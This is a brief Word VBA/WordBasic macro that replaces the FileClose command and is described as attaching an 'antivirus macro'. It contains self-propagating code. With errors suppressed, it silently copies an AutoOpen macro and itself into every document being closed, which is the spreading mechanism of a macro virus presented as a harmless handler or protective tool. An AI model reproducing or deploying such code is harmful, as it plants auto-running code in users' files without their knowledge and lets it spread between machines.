   Attribute VB_Name = "FileClose"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Closes all of the windows of the active document and attaches the antivirus macro. - Gururaj"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileClose.MAIN"
   Dim sMe$
   Dim sTMacro$

   Rem Attcah the antivirus to the file

   On Error Resume Next
   sMe$ = WordBasic.[FileName$]()
   sTMacro$ = sMe$ + ":AutoOpen"
   WordBasic.MacroCopy "Global:Antivirus", sTMacro$
   sTMacro$ = sMe$ + ":FileClose"
   WordBasic.MacroCopy "Global:FileClose", sTMacro$
   WordBasic.FileClose
   End Sub
